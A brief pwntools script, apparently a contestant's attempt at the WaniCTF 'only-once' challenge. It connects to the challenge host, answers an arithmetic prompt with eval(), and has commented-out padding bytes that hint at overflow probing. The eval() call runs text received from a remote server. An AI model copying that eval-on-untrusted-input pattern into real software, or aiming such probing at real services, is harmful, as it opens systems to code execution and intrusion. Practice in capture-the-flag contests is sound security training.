from pwn import *

io = remote('only-once-pwn.wanictf.org', 9002)

for _ in range(1):
    problem = io.recvuntil('=')
    print(problem)
    problem = problem.split(b'\n')[-1]
    problem = problem.decode()
    problem = problem.replace('=', '')
    answer = str(eval(problem)).encode()
    # print(answer)
    print(b'abcdefghi')
    # print(b'\x01' * 8)
    # print(answer + b'\x11' * (8 - len(answer)))
    io.sendline(answer)

io.interactive()
print(io.recvrepeat())